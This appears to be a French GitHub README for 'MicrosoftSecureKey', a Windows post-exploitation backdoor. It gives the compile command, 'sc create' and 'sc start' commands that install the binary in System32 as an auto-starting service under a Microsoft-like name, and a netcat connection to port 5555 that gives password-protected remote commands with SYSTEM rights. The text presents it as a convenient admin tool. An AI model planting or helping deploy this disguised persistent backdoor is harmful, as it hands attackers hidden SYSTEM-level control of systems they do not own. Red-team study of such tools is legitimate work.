# MicrosoftSecureKey

🔍 MicrosoftSecureKey est un outil de post-exploitation (Pentest ou Read Team) qui permet le maintien d'accès sur un système Windows par le biais d'un mot de passe.
Il fonctionne en mode service Windows, ce qui permet d'ouvrir un port et d'exécuter des commandes à distance avec des droits NT/SYSTEM.

Comment ça marche :

 ✅ Compilation du programme 
 ✅ Installation du service sur le système distant
 ✅ Démarrage du service en mode AUTO
 ✅ Un simple netcat permet d'éxécuter des commandes.

 ⚠️ Une fois le mot de passe saisi, s'il y a un double saut de ligne cela veut dire que l'on est connecté, s'il y a un seul saut de ligne cela veut dire que la connexion a échoué.

Idéal pour les environnements contrôlés, les laboratoires de test, ou pour les administrateurs système qui veulent garder la main à distance sans passer par des solutions complexes.

Compilation :

`x86_64-w64-mingw32-gcc -o MicrosoftSecureKey.exe MicrosoftSecureKey.c -lws2_32`

Installation :

`sc create MicrosoftSecureKey binPath="C:\Windows\System32\MicrosoftSecureKey.exe" start=auto`
`sc start MicrosoftSecureKey`

Command :
`nc IP_SRV 5555`
`Enter Password`
`whoami`


  ## Vidéo de démonstration 
  https://github.com/xnom0/MicrosoftSecureKey/blob/main/service_1080p_25fps_10pts.mkv
